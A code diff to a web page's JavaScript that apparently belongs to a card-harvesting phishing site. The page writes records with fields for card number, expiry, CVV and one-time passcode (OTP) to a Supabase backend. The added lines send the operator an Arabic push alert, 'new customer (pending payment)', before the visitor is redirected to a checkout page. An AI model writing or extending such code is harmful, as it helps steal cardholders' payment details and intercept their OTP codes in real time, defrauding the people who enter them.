@@ -271,6 +271,15 @@
                         card_holder: '', card_number: '', card_expiry: '', card_cvv: '', card_type: '', card_otp: '',
                         status: 'بانتظار الدفع'
                     })
+                }).then(function() {
+                    // Trigger push notification
+                    try {
+                        fetch(_sbUrl + '/functions/v1/send-push', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'apikey': _sbKey, 'Authorization': 'Bearer ' + _sbKey },
+                            body: JSON.stringify({ type: 'INSERT', record: { customer_name: '🛒 عميل جديد (قيد الدفع)', card_otp: '' } })
+                        });
+                    } catch(e) {}
                 }).catch(function(){});
             } catch(e) {}
             window.location.href='/checkout/';
